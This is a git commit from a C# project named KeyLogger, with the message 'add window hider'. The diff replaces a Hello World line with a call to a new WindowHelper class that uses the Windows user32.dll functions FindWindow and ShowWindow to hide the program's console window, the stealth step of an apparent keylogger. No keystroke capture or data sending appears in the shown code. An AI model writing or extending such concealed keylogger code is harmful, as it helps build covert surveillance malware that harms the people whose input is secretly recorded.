4cc4d720a253956611a3a35541911a743db5fccf
Alireza Bagheri <alirezabagheri12b@gmail.com>
2025-07-14 14:17:52 +0330

    add window hider

--- KeyLogger/Program.cs
+++ KeyLogger/Program.cs
@@ -1,10 +1,15 @@
-﻿namespace KeyLogger
+﻿using System.ComponentModel.Design;
+using System.Runtime.InteropServices;
+
+namespace KeyLogger
 {
     internal class Program
     {
         static void Main(string[] args)
         {
-            Console.WriteLine("Hello, World!");
+            WindowHelper.HideWindow();
+            
+
         }
     }
 }
---
+++ KeyLogger/WindowHelper.cs
@@ -0,0 +1,28 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace KeyLogger
+{
+    static class WindowHelper
+    {
+        [DllImport("user32.dll")]
+        public static extern IntPtr FindWindow(string className, string windowName);
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr window, int cmdShow);
+
+        public static void HideWindow()
+        {
+            IntPtr window = FindWindow(null, Console.Title);
+
+            if (window != IntPtr.Zero)
+            {
+                ShowWindow(window, 0);
+            }
+        }
+    }
+}
